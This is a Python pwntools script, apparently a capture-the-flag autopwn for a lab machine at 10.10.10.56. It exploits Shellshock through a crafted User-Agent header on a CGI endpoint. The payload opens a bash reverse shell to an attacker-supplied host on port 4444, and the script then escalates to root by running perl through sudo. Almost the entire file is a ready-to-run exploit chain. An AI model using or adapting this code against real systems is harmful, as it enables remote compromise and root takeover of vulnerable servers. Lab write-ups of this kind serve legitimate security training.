#!/usr/bin/python3

from pwn import *

# ctrl c

def def_handler(sig, frame):
    print("\n[+] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# variables globales

# banner

banner = """
 _______  __   __  _______  _______  ___   _  _______  ______           _______  __   __  _______  _______  _______  _     _  __    _ 
|       ||  | |  ||       ||       ||   | | ||       ||    _ |         |   _   ||  | |  ||       ||       ||       || | _ | ||  |  | |
|  _____||  |_|  ||   _   ||       ||   |_| ||    ___||   | ||   ____  |  |_|  ||  | |  ||_     _||   _   ||    _  || || || ||   |_| |
| |_____ |       ||  | |  ||       ||      _||   |___ |   |_||_ |____| |       ||  |_|  |  |   |  |  | |  ||   |_| ||       ||       |
|_____  ||       ||  |_|  ||      _||     |_ |    ___||    __  |       |       ||       |  |   |  |  |_|  ||    ___||       ||  _    |
 _____| ||   _   ||       ||     |_ |    _  ||   |___ |   |  | |       |   _   ||       |  |   |  |       ||   |    |   _   || | |   |
|_______||__| |__||_______||_______||___| |_||_______||___|  |_|       |__| |__||_______|  |___|  |_______||___|    |__| |__||_|  |__|

                                                                                                           by z3r0byte <3
"""

shellshock_url = "http://10.10.10.56/cgi-bin/user.sh"


def shellshock_request():

    print(banner)

    # shellshock request
    
    lhost = str(input("Introduce tu LHOST: "))
    lhost = lhost.strip("\n")
    
    p1 = log.progress("Shellshock")
    p1.status("tramitando petición")
    time.sleep(2)


    headers = {
        
        "User-Agent":"() { :;}; /bin/bash -c \"bash -i >& /dev/tcp/"+lhost+"/4444 0>&1\""
    }

    r = requests.post(shellshock_url, headers=headers)
    p1.success


def listener_and_privesc():
    
    p2 = log.progress("Ganando acceso al sistema")
    shell = listen(4444, timeout=120).wait_for_connection()

    if shell.sock is None:
        p2.failure("No se ha podido acceder al sistema")
        sys.exit(1)
    else:

        p2.success("Se ha obtenido acceso al sistema")

        p3 = log.progress("PrivEsc")
        
        p3.status("Escalando privilegios")
        time.sleep(2)
        
        shell.sendline(b"sudo -u root perl -e 'exec \"/bin/sh\";'")
        time.sleep(1)
        shell.interactive()
        
        


if __name__ == '__main__':

    threading.Thread(target=shellshock_request, args=()).start()

    listener_and_privesc()
    
